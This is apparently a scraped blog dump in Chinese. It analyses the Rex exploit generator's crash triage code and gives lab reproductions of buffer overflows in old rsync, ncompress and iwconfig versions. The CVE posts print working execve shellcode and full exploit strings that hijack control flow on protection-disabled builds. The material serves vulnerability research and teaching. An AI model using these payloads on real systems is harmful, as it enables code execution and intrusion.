a SimAction for each temporary variable read and write so.TRACK_JMP_ACTIONS Keep a SimAction for each jump or branch so.ACTION_DEPS Track dependencies in SimActions so.TRACK_CONSTRAINT_ACTIONS Keep a SimAction for each constraint added so.LAZY_SOLVES Don’t check satisfiability until absolutely necessary so.SIMPLIFY_MEMORY_WRITES Run values stored to memory through z3’s simplification so.ALL_FILES_EXIST Attempting to open an unkown file will result in creating it with a symbolic length 设置约束条件： （2） State PluginsSimState 属于 angr 核心概念之一，并被设计为插件式的架构，可以根据分析任务的不同，选用针对性的插件。Rex 默认选用了 ‘posix’ 与 ‘preconstrainer’。插件源码位于./angr/state_plugins/目录下。 SimSystemPosix()Data storage and interaction mechanisms for states with an environment conforming to posix.Available as state.posix. SimStatePreconstrainer()This state plugin manages the concept of preconstraining - adding constraints which you would like to remove later.:param constrained_addrs : SimActions for memory operations whose addresses should be constrained during crash analysis （3） 路径探索策略路径搜索策略的选择，对符号执行来说举足轻重。由于 Rex 在采用 Concolic Execution，因此设置了 ‘Tracer’、’Oppologist’ 两种路径搜索策略。 angr 内置的路径搜索方法存储于 ./angr/exploration_techniques/ 目录下。Crash.py 中调用代码如下： 3、Crash Triage_triage_crash() 中根据 eip、ebp 中符号变量的个数，及发生崩溃时的操作，对 Crash 类型进行判定。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172def _triage_crash(self): ip = self.state.regs.ip bp = self.state.regs.bp # any arbitrary receives or transmits # TODO: receives zp = self.state.get_plugin('zen_plugin') if self.os == 'cgc' else None if zp is not None and len(zp.controlled_transmits): l.debug(\"detected arbitrary transmit vulnerability\") self.crash_types.append(Vulnerability.ARBITRARY_TRANSMIT) # we assume a symbolic eip is always exploitable if self.state.solver.symbolic(ip): # how much control of ip do we have? if self._symbolic_control(ip) &gt;= self.state.arch.bits: l.info(\"detected ip overwrite vulnerability\") self.crash_types.append(Vulnerability.IP_OVERWRITE) else: l.info(\"detected partial ip overwrite vulnerability\") self.crash_types.append(Vulnerability.PARTIAL_IP_OVERWRITE) return if self.state.solver.symbolic(bp): # how much control of bp do we have if self._symbolic_control(bp) &gt;= self.state.arch.bits: l.info(\"detected bp overwrite vulnerability\") self.crash_types.append(Vulnerability.BP_OVERWRITE) else: l.info(\"detected partial bp overwrite vulnerability\") self.crash_types.append(Vulnerability.PARTIAL_BP_OVERWRITE) return # if nothing obvious is symbolic let's look at actions # grab the all actions in the last basic block symbolic_actions = [ ] if self._t is not None and self._t.last_state is not None: recent_actions = reversed(self._t.last_state.history.recent_actions) state = self._t.last_state # TODO: this is a dead assignment! what was this supposed to be? else: recent_actions = reversed(self.state.history.actions) state = self.state for a in recent_actions: if a.type == 'mem': if self.state.solver.symbolic(a.addr): symbolic_actions.append(a) # TODO: pick the crashing action based off the crashing instruction address, # crash fixup attempts will break on this #import ipdb; ipdb.set_trace() for sym_action in symbolic_actions: if sym_action.action == \"write\": if self.state.solver.symbolic(sym_action.data): l.info(\"detected write-what-where vulnerability\") self.crash_types.append(Vulnerability.WRITE_WHAT_WHERE) else: l.info(\"detected write-x-where vulnerability\") self.crash_types.append(Vulnerability.WRITE_X_WHERE) self.violating_action = sym_action break if sym_action.action == \"read\": # special vulnerability type, if this is detected we can explore the crash further l.info(\"detected arbitrary-read vulnerability\") self.crash_types.append(Vulnerability.ARBITRARY_READ) self.violating_action = sym_action break return 五、小结以上是对 Exploit 自动生成引擎 Rex 的简要介绍，包括 Rex 是什么、如何安装、源码结构，并结合论文，着重对 Crash 可利用性判定的相关代码进行分析。弟作为一只二进制菜鸡，胡言乱语了这么多，望各位师傅批评指正 Orz… 六、参考资料： rex https://github.com/shellphish/rex Mechaphish https://github.com/mechaphish Shellphish http://shellphish.net/cgc/ angr docs https://docs.angr.io angr https://github.com/angr 《SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis》 https://github.com/Ma3k4H3d/Papers/blob/master/2016_SP_angrSoK.pdf","categories":[{"name":"AEG","slug":"AEG","permalink":"http://maskhed.github.io/categories/AEG/"}],"tags":[{"name":"CGC","slug":"CGC","permalink":"http://maskhed.github.io/tags/CGC/"}]},{"title":"CVE-2004-2093(rsync)缓冲区溢出漏洞分析与复现","slug":"CVE-2004-2093","date":"2019-03-19T12:34:03.000Z","updated":"2019-03-29T09:30:36.269Z","comments":true,"path":"2019/03/19/CVE-2004-2093/","link":"","permalink":"http://maskhed.github.io/2019/03/19/CVE-2004-2093/","excerpt":"Rsync is a fast and extraordinarily versatile file copying tool. It can copy locally, to/from another host over any remote shell, or to/from a remote rsync daemon. It offers a large number of options that control every aspect of its behavior and permit very flexible specification of the set of files to be copied. It is famous for its delta-transfer algorithm, which reduces the amount of data sent over the network by sending only the differences between the source files and the existing files in the destination. Rsync is widely used for backups and mirroring and as an improved copy command for everyday use.","text":"Rsync is a fast and extraordinarily versatile file copying tool. It can copy locally, to/from another host over any remote shell, or to/from a remote rsync daemon. It offers a large number of options that control every aspect of its behavior and permit very flexible specification of the set of files to be copied. It is famous for its delta-transfer algorithm, which reduces the amount of data sent over the network by sending only the differences between the source files and the existing files in the destination. Rsync is widely used for backups and mirroring and as an improved copy command for everyday use. Rsync finds files that need to be transferred using a “quick check” algorithm (by default) that looks for files that have changed in size or in last-modified time. Any changes in the other preserved attributes (as requested by options) are made on the destination file directly when the quick check indicates that the file’s data does not need to be updated. Some of the additional features of rsync are: support for copying links, devices, owners, groups, and permissions exclude and exclude-from options similar to GNU tar a CVS exclude mode for ignoring the same files that CVS would ignore can use any transparent remote shell, including ssh or rsh does not require super-user privileges pipelining of file transfers to minimize latency costs support for anonymous or authenticated rsync daemons (ideal for mirroring) 0x01 漏洞描述 0x02 CVE-2004-2093 漏洞原理1、源码溢出点位于 socket.c 文件中的 open_socket_out() 函数内。漏洞产生的原因在于，程序读入环境变量 RSYNC_PROXY 时未检查缓冲区边界。当使用 rsync 连接远程 deamon 服务器时会触发漏洞。rsync 手册中对 “CONNECTING TO AN RSYNC DAEMON” 的描述如下： CONNECTING TO AN RSYNC DAEMONIt is also possible to use rsync without a remote shell as the transport. In this case you will directly connect to a remote rsync daemon, typically using TCP port 873. (This obviously requires the daemon to be running on the remote system, so refer to the STARTING AN RSYNC DAEMON TO ACCEPT CONNECTIONS section below for information on that.) Using rsync in this way is the same as using it with a remote shell except that: you either use a double colon :: instead of a single colon to separate the hostname from the path, or you use an rsync:// URL. the first word of the “path” is actually a module name. the remote daemon may print a message of the day when you connect. if you specify no path name on the remote daemon then the list of accessible paths on the daemon will be shown. if you specify no local destination then a listing of the specified files on the remote daemon is provided. you must not specify the –rsh (-e) option.An example that copies all the files in a remote module named “src”: rsync -av host::src /dest open_socket_out() 函数如下： 2、汇编溢出点处，strcpy() 的目的地址为 portbuf[10]。查看汇编代码，portbuf 地址为 RBP - 0x7a，因此偏移量为 0x7a。 3、Debug基于以上分析，尝试构造 PoC，构造条件为 PoC 中需包含字符 “:” “:” 后的数据为 122 字节（0x7a） 122 字节后追加 6 字节，覆盖 RIP。最终 PoC 为：1python -c 'print \"AAAA:\" + \"A\"*122 + \"BBBBBB\"' 通过 GDB 进行调试，运行参数为：run -av localhost::src /dest。使用 set environment RSYNC_PROXY=PoC 将 PoC 传入。 在 &lt; open_socket_out+229 > 处设置断点，即溢出点前。查看程序运行状态如下： 使用命令 “ni” 单步执行，触发溢出。 可见，RIP 被覆盖为 0x0000424242424242。执行至 open_socket_out() 返回，触发异常： 控制流已被成功劫持。完整过程如下： 0x02 Exploit通过 ret2text 的方式，在实验环境下实现任意代码执行。 1、实验环境修改原 Makefile 文件中的 gcc 选项，关闭安全机制： checksec 结果如下：12345678pwndbg&gt; checksec[*] '/root/AEG_DataSet/rsync-2.5.7/rsync' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 使用 shellcode 如下，功能为调用 /bin/bash，共计 24 字节。12// 调用 /bin/bash (24 byte)shellcode = '\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05' 2、GDB基于上文分析，使用 retAddr = 0x7fffffffe1fe，构造 Exp 如下：1'AAAA:' + '\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05' + 'A'*98 + '\\xfe\\xe1\\xff\\xff\\xff\\x7f'\") 使用 export 命令将 Exp 写入环境变量：1export RSYNC_PROXY=\"`python -c 'print \"AAAA:\"+\"\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\" + \"A\"*98 + \"\\xfe\\xe1\\xff\\xff\\xff\\x7f\"'`\" 使用 GDB 加载并执行 rsync，在 &lt; open_socket_out+234 > 处设置断点，并查看程序状态： 执行至 open_socket_out() 返回，控制流被劫持，跳转至 shellcode 并执行。 至此，完成了对 CVE-2004-2093 的分析，并在实验环境下编写了 Exploit。 参考文献： rsync download rsync doc Vulnerability Details : CVE-2004-2093","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://maskhed.github.io/categories/漏洞分析/"}],"tags":[]},{"title":"CVE-2001-1413(nCompress) 缓冲区溢出漏洞分析及复现","slug":"CVE-2001-1413","date":"2019-03-15T07:12:02.000Z","updated":"2019-03-19T13:04:16.774Z","comments":true,"path":"2019/03/15/CVE-2001-1413/","link":"","permalink":"http://maskhed.github.io/2019/03/15/CVE-2001-1413/","excerpt":"Compress is a fast, simple LZW file compressor. Compress does not have the highest compression rate, but it is one of the fastest programs to compress data. Compress is the defacto standard in the UNIX community for compressing files.","text":"Compress is a fast, simple LZW file compressor. Compress does not have the highest compression rate, but it is one of the fastest programs to compress data. Compress is the defacto standard in the UNIX community for compressing files. 0x00 漏洞描述Stack-based buffer overflow in the comprexx function for ncompress 4.2.4 and earlier, when used in situations that cross security boundaries (such as FTP server), may allow remote attackers to execute arbitrary code via a long filename argument. CVE Details 0x01 CVE-2001-1413 漏洞原理1、源码溢出点位于 compress42.c 中的 comprexx() 函数内。 *fileptr 为传入的文件名，数组 tempname[MAXPATHLEN] 的大小为 1024 字节。 2、汇编查看汇编代码，编译时为 comprexx() 分配的空间为 0x550，变量 tempname 起始地址为 rbp-0x410。因此，构造 PoC： ‘A’ * 1040 + RBP + RIP，即可导致程序崩溃。 3、Debug基于以上分析，构造 PoC 为 python -c ‘print “A”*1054’，将程序断至 &lt; comprexx+41 &gt; 处： 单步执行，触发漏洞。此时，RSP=0x7fffffffd960、RBP=0x7fffffffdeb0，查看 RBP 附近： 1234567891011pwndbg&gt; x/20gx 0x7fffffffde600x7fffffffde60: 0x4141414141414141 0x41414141414141410x7fffffffde70: 0x4141414141414141 0x41414141414141410x7fffffffde80: 0x4141414141414141 0x41414141414141410x7fffffffde90: 0x4141414141414141 0x41414141414141410x7fffffffdea0: 0x4141414141414141 0x41414141414141410x7fffffffdeb0: 0x4141414141414141 0x00004141414141410x7fffffffdec0: 0x00007ffff7de59a0 0x000000000074a2600x7fffffffded0: 0x0000000000403660 0x00000000000000000x7fffffffdee0: 0x0000000000400d20 0x00007fffffffdfd00x7fffffffdef0: 0x0000000000403660 0x00007ffff7a05b97 可见，RBP 被覆盖为 0x4141414141414141，RIP 被覆盖为 0x0000414141414141。执行至函数返回： 0x02 Exploit本文侧重点在于分析漏洞成因，不过多涉及 Exploit 编写技术。在此选用 ret2text 的方式，仅以验证为目的。 1、实验环境将源码中的 Makefile.def 重命名为 Makefile，并修改 GCC 配置： checksec 结果如下：1234567[*] '/root/AEG_DataSet/ncompress-4.2.4/compress' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 使用 shellcode 如下，功能为调用 /bin/bash，共计 24 字节。12// 调用 /bin/bash (24 byte)shellcode = '\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05' 2、GDB基于以上分析可知，偏移量为 1048，使用 0x7fffffffdaa0 作为返回地址，构造 Exp 如下：(python -c “print ‘\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05’ + ‘A’*1024 + ‘\\xa0\\xda\\xff\\xff\\xff\\x7f’”)。 将 Exploit 传入 GDB，并触发漏洞： 执行至函数返回，成功劫持控制流，并执行 shellcode。 至此，完成了对 CVE-2001-1413 的分析，并在实验环境下编写了 Exploit。 参考文献 ncompress Vulnerability Details : CVE-2001-1413","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://maskhed.github.io/categories/漏洞分析/"}],"tags":[]},{"title":"CVE-2003-0947(iwconfig)缓冲区溢出分析及复现","slug":"CVE-2003-0947","date":"2019-03-14T01:20:12.000Z","updated":"2019-03-19T13:04:43.700Z","comments":true,"path":"2019/03/14/CVE-2003-0947/","link":"","permalink":"http://maskhed.github.io/2019/03/14/CVE-2003-0947/","excerpt":"iwconfig 是 Linux Wireless Extensions(LWE) 的用户层配置工具之一。LWE 是 Linux 下对无线网络配置的工具，包括内核的支持、用户层配置工具和驱动接口的支持三部分。目前很多无线网卡都支持 LWE，而且主流的 Linux 发布版本，比如 Redhat Linux、Ubuntu Linux 都已经带了这个配置工具。 –《百度百科》","text":"iwconfig 是 Linux Wireless Extensions(LWE) 的用户层配置工具之一。LWE 是 Linux 下对无线网络配置的工具，包括内核的支持、用户层配置工具和驱动接口的支持三部分。目前很多无线网卡都支持 LWE，而且主流的 Linux 发布版本，比如 Redhat Linux、Ubuntu Linux 都已经带了这个配置工具。 –《百度百科》 0x00 漏洞描述待分析的 iwconfig V.26 存在两个漏洞，分别为 CVE-2003-0947、CVE-2003-0948。此次主要对 CVE-2003-0947 进行分析。 漏洞描述如下： Buffer overflow in iwconfig, when installed setuid, allows local users to execute arbitrary code via a long OUT environment variable. CVSS 评分： 影响版本： 0x01 CVE-2003-0947 漏洞原理1、源码导致漏洞产生的原因是，位于 iwconfig.c 中的 get_info() 函数在调用 strcpy() 时，未检查缓冲区大小，导致栈溢出。如下图所示，蓝色箭头表示从 main() 函数开始至溢出点的函数调用过程，红色箭头表示输入数据的传递过程，左下方绿色区域为结构体 ifreq 定义，右下方为 iw_get_ext() 函数体。 对溢出点 strcpy(ifr.ifr_name, ifname) 进行分析。ifname 为输入参数 argv[1] 传递所得，在整个传参过程中，程序未对其进行任何检查。查看系统对结构体 ifreq 的定义，可见 ifr.ifr_name 的大小为 16 字节。意味着，只要使得输入参数 argv[1] 远大于 16 字节，即可造成缓冲区溢出，使程序崩溃。注意：在到达溢出点前，需要调用 iw_get_ext(skfd, ifname, SIOCGIWNAME, &amp;wrq) 函数，由于传入的 ifname 为无意义数据，使得 iw_get_ext(skfd, ifname, SIOCGIWNAME, &amp;wrq) 返回值为 -1，因此能够进入存在漏洞的分支路径中。 2、汇编基于汇编代码，对溢出点进一步分析。由下图可知，系统为 get_info() 分配空间 0x70，ifr.ifr_name 所在地址为 rbp-0x50。因此，构造 PoC 为 ‘A’ * 80 + ‘RBP’ + ‘RIP’，即可导致程序崩溃。 3、Debug基于以上分析，构造 PoC 为 python -c ‘print “A”*88 + “BBBBBB”‘，并通过 GDB 进行验证。在 &lt; get_info + 82 > 处设置断点，即溢出点前： 此时，RSP=0x7fffffffdf80、RBP=0x7fffffffdff0，ifr.ifr_name 地址为 0x7fffffffdfa0，查看栈空间如下。 1234567891011pwndbg&gt; x/20gx $rsp0x7fffffffdf80: 0x00000000ffffffff 0x00007fffffffe0200x7fffffffdf90: 0x00007fffffffe747 0x00000003f7fe74e00x7fffffffdfa0: 0x00007fffffffe3d0 0x00000000004010100x7fffffffdfb0: 0x00007fffffffe4e0 0x00000000000000000x7fffffffdfc0: 0x0000000000000000 0x00007ffff7de4ec30x7fffffffdfd0: 0x4141414141414141 0x41414141414141410x7fffffffdfe0: 0x00007fffffffe400 0x00000000004010100x7fffffffdff0: 0x00007fffffffe3d0 0x000000000040244b0x7fffffffe000: 0x0000000000000000 0x00000000000000000x7fffffffe010: 0x00007fffffffe747 0x0000000300000000 单步调试至触发溢出。 再次查看栈空间，可见 0x7fffffffdff0 处的 RBP 已被覆盖为 0x4141414141414141，0x7fffffffdff8 处的 RIP 被覆盖为 0x0000424242424242。 1234567891011pwndbg&gt; x/20gx $rsp0x7fffffffdf80: 0x00000000ffffffff 0x00007fffffffe0200x7fffffffdf90: 0x00007fffffffe747 0x00000003f7fe74e00x7fffffffdfa0: 0x4141414141414141 0x41414141414141410x7fffffffdfb0: 0x4141414141414141 0x41414141414141410x7fffffffdfc0: 0x4141414141414141 0x41414141414141410x7fffffffdfd0: 0x4141414141414141 0x41414141414141410x7fffffffdfe0: 0x4141414141414141 0x41414141414141410x7fffffffdff0: 0x4141414141414141 0x00004242424242420x7fffffffe000: 0x0000000000000000 0x00000000000000000x7fffffffe010: 0x00007fffffffe747 0x0000000300000000 执行至 get_info() 返回，抛出异常，RIP 已被劫持为 0x424242424242。 0x02 Exploit本文侧重点在于分析漏洞成因，不过多涉及 Exploit 编写技术。在此选用 ret2text 的方式，仅以验证为目的。 1、实验环境修改原 Makefile 文件中的 gcc 选项，关闭安全机制： 12# CFLAGS=-O2 -W -Wall -Wstrict-prototypesCFLAGS=-W -Wall -g -z execstack -fno-stack-protector -no-pie -z norelro -O2 选项会对代码进行优化，在 gcc 7.3.0 下会开启 FORTIFY，因此关闭该选项 -z execstack，关闭 NX -fno-stack-protector，关闭 Canary -no-pie，关闭 PIE -z norelro，关闭 RELRO -g， Debug 模式 checksec 结果如下：12345678$ checksec iwconfig[*] '/root/AEG_DataSet/wireless_tools.26/iwconfig' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 使用 shellcode 如下，功能为调用 /bin/bash，共计 24 字节。12// 调用 /bin/bash (24 byte)shellcode = '\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05' 2、GDB基于以上分析可知，ifr.ifr_name 地址为 0x7fffffffdfa0，与 RIP 之间的偏移量为 88，使用 0x7fffffffdfa0 作为返回地址，构造 Exp 如下：(python -c “print ‘\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05’ + ‘A’*64 + ‘\\xa0\\xdf\\xff\\xff\\xff\\x7f\\x00\\x00’”)。将 Exploit 传入 GDB，并触发漏洞： 执行至 get_info() 返回，成功劫持控制流，并执行 shellcode。 至此，完成了对 CVE-2003-0947 的分析，并在实验环境下编写了 Exploit。 参考文献： iwconfig V.26下载地址 Vulnerability Details : CVE-2003-0947 SecurityFocus: iwconfig CVE-2003-0947 Local Security Vulnerability linux程序的常用保护机制 Wireless Tools 26 (IWConfig) - ARGV Local Command Line Buffer Overflow","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://maskhed.github.io/categories/漏洞分析/"}],"tags":[]},{"title":"Rex：源码分析 -- Crash Analysis","slug":"rex-crash","date":"2019-01-23T08:54:13.000Z","updated":"2019-01-23T09:15:46.442Z","comments":true,"path":"2019/01/23/rex-crash/","link":"","permalink":"http://maskhed.github.io/2019/01/23/rex-crash/","excerpt":"本文用以梳理 Rex 复现、分析 Crash 时的原理及工程实现。相关代码，位于 Crash 类中。复现原理，论文中描述如下： Vulnerable States. Unlike AEG/Mayhem, but similar to AXGEN, we generate exploits by performing concolic execution on crashing program inputs using angr. We drive concolic execution forward, forcing it to follow the same path as a dynamic trace gathered by concretely executing the crashing input applied to the program. Concolic execution is stopped at the point where the program crashed, and we inspect the symbolic state to determine the cause of the crash and measure exploitability. By counting the number of symbolic bits in certain registers, we can triage a crash into a number of categories such as frame pointer overwrite, instruction pointer overwrite, or arbitrary write, among others.","text":"本文用以梳理 Rex 复现、分析 Crash 时的原理及工程实现。相关代码，位于 Crash 类中。复现原理，论文中描述如下： Vulnerable States. Unlike AEG/Mayhem, but similar to AXGEN, we generate exploits by performing concolic execution on crashing program inputs using angr. We drive concolic execution forward, forcing it to follow the same path as a dynamic trace gathered by concretely executing the crashing input applied to the program. Concolic execution is stopped at the point where the program crashed, and we inspect the symbolic state to determine the cause of the crash and measure exploitability. By counting the number of symbolic bits in certain registers, we can triage a crash into a number of categories such as frame pointer overwrite, instruction pointer overwrite, or arbitrary write, among others. 不难看出关键词为 “concolic execution”，即混合符号执行。通过 concolic-execution 将程序从初始状态引导至 Crash 状态，以 EIP 中符号变量的数量为依据，实现对漏洞类型的判定。 0x00 Concrete ExecutionConcolic Execution 原理本文不做详细介绍。Rex 在实现过程中，首先通过 QEMU，加载二进制程序及 PoC，以 Concrete Execution 的方式得到 crash_state。Rex 调用 Tracer 模块实现相关功能。如同 Tracer 文档中所说一样，Tracer 原本用以辅助 Angr 实现 Concolic tracing，但随着 Angr 的迭代升级，已将相关功能集成在自身之中。Rex 在调用 Tracer 时，也仅使用其中的 QEMURunner() 方法，完成 Concrete Execution。crash.py 中相关代码如下：1234tracer_args=&#123;'ld_linux': os.path.join(bin_location, 'tests/i386/ld-linux.so.2'),'library_path': os.path.join(bin_location, 'tests/i386')&#125;r = tracer.QEMURunner(binary=binary, input=input_data, argv=argv, trace_timeout=trace_timeout, **tracer_args) 0x01 Concolic Execution在获取到 Crash 状态之后，以 Concrete-Execution 结果为引导，将程序执行路径限定在存在 Crash 的路径上，并在该路径上进行符号执行。由于 Angr 基于 UC-KLEE 所提出的 under-constrained symbolic execution(UCSE) 所实现，因此约束条件及初始状态的设定、路径探索的策略、分析技术的选取对最终结果具有重要影响。 1、simulation_manager()simulation_manager 是 Angr 的核心概念之一。 Rex 中的设置如下，其中 r.crash_mode 为布尔值 “True/False”： 通过 full_init_state()方法，配置程序的初始状态： full_init_state()中所设置参数的含义如下，定义在./angr/sim_options.py中： mode = ‘tracing’ add_options: Option name Description so.MEMORY_SYMBOLIC_BYTES_MAP Maintain a mapping of symbolic variable to which memory address it “really” corresponds to, at the paged memory level? so.TRACK_ACTION_HISTORY track the history of actions through a path (multiple states). This action affects things on the angr level so.CONCRETIZE_SYMBOLIC_WRITE_SIZES Concretize the sizes of symbolic writes to memory so.CONCRETIZE_SYMBOLIC_FILE_READ_SIZES Concreteize the sizes of file reads so.TRACK_MEMORY_ACTIONS Keep a SimAction for each memory read and write remove_options:由于 ‘tracing’ 模式下预制了一些选项，因此在优化策略时，不仅需要add_options，而且需要 remove_options。 Option name Description so.TRACK_REGISTER_ACTIONS Keep a SimAction for each register read and write so.TRACK_TMP_ACTIONS Keep a SimAction for each temporary variable read and write so.TRACK_JMP_ACTIONS Keep a SimAction for each jump or branch so.ACTION_DEPS Track dependencies in SimActions so.TRACK_CONSTRAINT_ACTIONS Keep a SimAction for each constraint added so.LAZY_SOLVES Don’t check satisfiability until absolutely necessary so.SIMPLIFY_MEMORY_WRITES Run values stored to memory through z3’s simplification so.ALL_FILES_EXIST Attempting to open an unkown file will result in creating it with a symbolic length 通过full_init_state()，设置约束条件。 2、 state_register_plugin()Program State 是 Angr 中的另一个核心概念。state 在工程实现时，采用插件式的架构，可以根据分析任务的不同，针对性的选用最适合的插件。Rex 默认选用了’posix’、’preconstrainer’ 插件，代码如下图所示。插件源码位于./angr/state_plugins/目录下。 SimSystemPosix()Data storage and interaction mechanisms for states with an environment conforming to posix.Available as state.posix. SimStatePreconstrainer()This state plugin manages the concept of preconstraining - adding constraints which you would like to remove later.:param constrained_addrs : SimActions for memory operations whose addresses should be constrained during crash analysis 3、 exploration_techniques()路径搜索策略，在符号执行中具有至关重要的作用。由于 Rex 在复现 Crash 的过程中采用 concolic-execution 方式，因此使用了 ‘Tracer’、’Oppologist’ 两种路径搜索策略。源码在./angr/exploration_techniques/目录下，调用代码如下： Tracer OppologistThe Oppologist is an exploration technique that forces uncooperative code through QEMU. 0x03 Triage_triage_crash() 中根据 eip、ebp 中符号变量的个数，及发生崩溃时的操作，定义了七种漏洞类型。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172def _triage_crash(self): ip = self.state.regs.ip bp = self.state.regs.bp # any arbitrary receives or transmits # TODO: receives zp = self.state.get_plugin('zen_plugin') if self.os == 'cgc' else None if zp is not None and len(zp.controlled_transmits): l.debug(\"detected arbitrary transmit vulnerability\") self.crash_types.append(Vulnerability.ARBITRARY_TRANSMIT) # we assume a symbolic eip is always exploitable if self.state.solver.symbolic(ip): # how much control of ip do we have? if self._symbolic_control(ip) &gt;= self.state.arch.bits: l.info(\"detected ip overwrite vulnerability\") self.crash_types.append(Vulnerability.IP_OVERWRITE) else: l.info(\"detected partial ip overwrite vulnerability\") self.crash_types.append(Vulnerability.PARTIAL_IP_OVERWRITE) return if self.state.solver.symbolic(bp): # how much control of bp do we have if self._symbolic_control(bp) &gt;= self.state.arch.bits: l.info(\"detected bp overwrite vulnerability\") self.crash_types.append(Vulnerability.BP_OVERWRITE) else: l.info(\"detected partial bp overwrite vulnerability\") self.crash_types.append(Vulnerability.PARTIAL_BP_OVERWRITE) return # if nothing obvious is symbolic let's look at actions # grab the all actions in the last basic block symbolic_actions = [ ] if self._t is not None and self._t.last_state is not None: recent_actions = reversed(self._t.last_state.history.recent_actions) state = self._t.last_state # TODO: this is a dead assignment! what was this supposed to be? else: recent_actions = reversed(self.state.history.actions) state = self.state for a in recent_actions: if a.type == 'mem': if self.state.solver.symbolic(a.addr): symbolic_actions.append(a) # TODO: pick the crashing action based off the crashing instruction address, # crash fixup attempts will break on this #import ipdb; ipdb.set_trace() for sym_action in symbolic_actions: if sym_action.action == \"write\": if self.state.solver.symbolic(sym_action.data): l.info(\"detected write-what-where vulnerability\") self.crash_types.append(Vulnerability.WRITE_WHAT_WHERE) else: l.info(\"detected write-x-where vulnerability\") self.crash_types.append(Vulnerability.WRITE_X_WHERE) self.violating_action = sym_action break if sym_action.action == \"read\": # special vulnerability type, if this is detected we can explore the crash further l.info(\"detected arbitrary-read vulnerability\") self.crash_types.append(Vulnerability.ARBITRARY_READ) self.violating_action = sym_action break return Rex 中对漏洞类型的定义如下： 0x04 小结以上是对 Rex 复现 Crash 部分的简要分析，原理上是依靠 Concolic Execution，工程实现上主要依靠 QEMU 与 Angr。粗浅的表面分析，后续逐步深入。","categories":[{"name":"AEG","slug":"AEG","permalink":"http://maskhed.github.io/categories/AEG/"}],"tags":[{"name":"CGC","slug":"CGC","permalink":"http://maskhed.github.io/tags/CGC/"}]},{"title":"Rex AEG：栈溢出之 Exploit 自动生成","slug":"Rex-stacksmash","date":"2019-01-17T07:47:40.000Z","updated":"2019-03-01T07:18:47.583Z","comments":true,"path":"2019/01/17/Rex-stacksmash/","link":"","permalink":"http://maskhed.github.io/2019/01/17/Rex-stacksmash/","excerpt":"本文通过调试 test_rex.py 中的 test_linux_stacksmash() 函数，以加深对 Rex 的理解。测试函数 test_linux_stacksmash() 是 Rex 开发团队给出的测试代码，用以展示 Rex 对栈溢出漏洞的自动利用能力。官方提供的测试样例 vuln_stacksmash 为 elf 格式的可执行文件，其中存在栈溢出漏洞，Rex 通过 rop2system、rop2text、jmpesp 三种方式实现了对该漏洞的自动化利用。下文为学习笔记，若存在理解有误的地方，请各位师傅批评指正。","text":"本文通过调试 test_rex.py 中的 test_linux_stacksmash() 函数，以加深对 Rex 的理解。测试函数 test_linux_stacksmash() 是 Rex 开发团队给出的测试代码，用以展示 Rex 对栈溢出漏洞的自动利用能力。官方提供的测试样例 vuln_stacksmash 为 elf 格式的可执行文件，其中存在栈溢出漏洞，Rex 通过 rop2system、rop2text、jmpesp 三种方式实现了对该漏洞的自动化利用。下文为学习笔记，若存在理解有误的地方，请各位师傅批评指正。 0x00 vuln_stacksmash 栈溢出漏洞通过 r2 查看 vuln_stacksmash。sym.vuln 函数中，系统所分配的空闲空间为 0x58，使用 read(int fd, void * buf, size_t count) 函数读入数据时，count 设置为 0x100，超出系统所分配的空闲空间 0x58，导致栈溢出。 使用 GDB 调试 vuln_stacksmash，分析溢出点状态。调试时需注意，main() 函数中调用 sym.imp.system 时创建了新进程，因此需要在 GDB 中设置 set follow-fork-mode parent，使 GDB 始终附加在父进程中。否则在调试过程 GDB 会跟踪至子进程并自动退出。 首先查看 vuln_stacksmash 保护机制开启情况，由下图可知未开启任何保护机制。 使用 GDB 加载 vuln_stacksmash，运行至溢出点，程序状态如下： 计算偏移为 0x44，构造 PoC 并输入。检查栈上的数据情况，可见 EBP 已被 “\\x41\\x41\\x41\\x41” 覆盖，后续四个字节为 EIP 值，也已被覆盖为“\\x42\\x42\\x42\\x42”。 跟踪至 ret 指令，触发异常，EIP 被劫持为“\\x42\\x42\\x42\\x42”。 由于 vuln_stacksmash 存在典型栈溢出漏洞，且未开启安全机制，因此存在多种利用方式。下文概要分析如何使用 Rex 自动生成 Exploit。 0x01 test_linux_stacksmash()由于 Rex 封装的原因，整体代码看起来较为简洁，从漏洞复现、漏洞类型判定、Exploit 生成到漏洞验证，共计 10 行代码。其中，Crash 